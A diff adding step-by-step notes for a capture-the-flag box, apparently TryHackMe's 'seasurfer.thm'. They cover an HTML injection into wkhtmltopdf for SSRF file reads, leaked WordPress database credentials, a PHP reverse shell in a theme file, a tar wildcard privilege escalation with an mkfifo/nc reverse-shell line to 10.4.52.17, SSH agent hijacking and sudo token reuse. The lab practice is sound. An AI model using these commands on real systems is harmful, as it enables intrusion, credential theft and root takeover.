@@ -1,0 +1,101 @@
+1. use whatweb to know domain seasurfer.com and then map with IP in /etc/hosts.
+
+2. use ffuf to know vhost
+   ffuf -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -u http://seasurfer.thm -H "HOST: FUZZ/seasurfer.thm" -fw 3499
+
+3. internal.seasurfer.thm (vhost)
+   Fill the form and get the pdf file > download the pdf file
+
+4. exiftool pdf_file > wkhtmltopdf 0.12.5 is vul (sea surf exploit)
+
+5. inject html code "><iframe height="2000" width="800" src=http://10.4.52.17/></iframe>
+
+6. run the python http redirect.py
+   redirect.py redirects a http request file:///etc/passwd (SSRF to LFI)
+
+7. this domain use wordpress
+   do some fuzzing to seasurfer.thm/
+   redirect.py redirects a http request file:///var/www/wordpress/wp-config.php   
+
+   define( 'DB_NAME', 'wordpress' );
+   define( 'DB_USER', 'wordpressuser' );
+   define( 'DB_PASSWORD', 'coolDataTablesMan' );
+
+   Let's do some fuzzing
+
+8. Found the path /adminer (MYSQL site)
+   wp-users > select > copy kyle hash (phppass)
+
+9. user=kyle pass=jenny4ever 
+
+10. go to seasurfer.thm/wp-admin
+    php reverse shell injected in seasurfer.thm/wp-admin/themes/404.php
+
+11. test with linpeas.sh in /tmp folder
+    find the backup.sh
+
+12. in backup.sh, there is a tar file under /var/www/internal/invoices, we have to do tar privilege escalation.
+
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.4.52.17 4444 >/tmp/f" > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+Stealing SSH TOKEN
+---------------------
+
+13. go to /tmp/ 
+    there are two ssh sessions ,root user ssh session cannot be chosen (without permission) > choose kyle user
+
+    export SSH_AUTH_SOCK=/tmp/ssh-LAY7cTHGrEm1/agent.1139
+
+>> Learn agent authentication with PAM it is as easy as adding environment variable for the "SSH_AUTH_SOCK"
+
+14. #sudo -l
+    #sudo su
+
+
+
+
+{
+
+//search >> bash: ./linpeas.sh: /bin/sh: bad interpreter: Text file busy
+
+    checking sudo tokens
+    ptrace protection is disabled.
+
+    So, we can reuse the sudo token.
+
+    IN HACKTRICKS(in google)
+    You already have a shell as user "sampleuser" (kyle)
+    "Kyle" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows us to use sudo without introducing any password)
+
+14. #ps aux
+
+    kyle        1153  0.0  0.1   6892  2304 pts/0    Ss+  04:14   0:00 bash -c sudo
+
+    cat /proc/sys/kernel/yama/ptrace_scope is 0
+    gdb is accessible (you can be able to upload it)
+
+
+    If no gdb install gdb9 ubuntu repo install (in google)
+    https://ubuntu.pkgs.org/20.04/ubuntu-main-amd64/gdb_9.1-0ubuntu1_amd64.deb.html
+
+    send to kyle
+
+15. #dpkg -x gdb1.deb /home/kyle/test
+    #cd /home/kyle/test/usr/bin
+    #./gdb
+    quit
+
+16. go to https://github.com/nongiach/sudo_inject
+
+}
+
+
+
+
+
+
+
+    
+
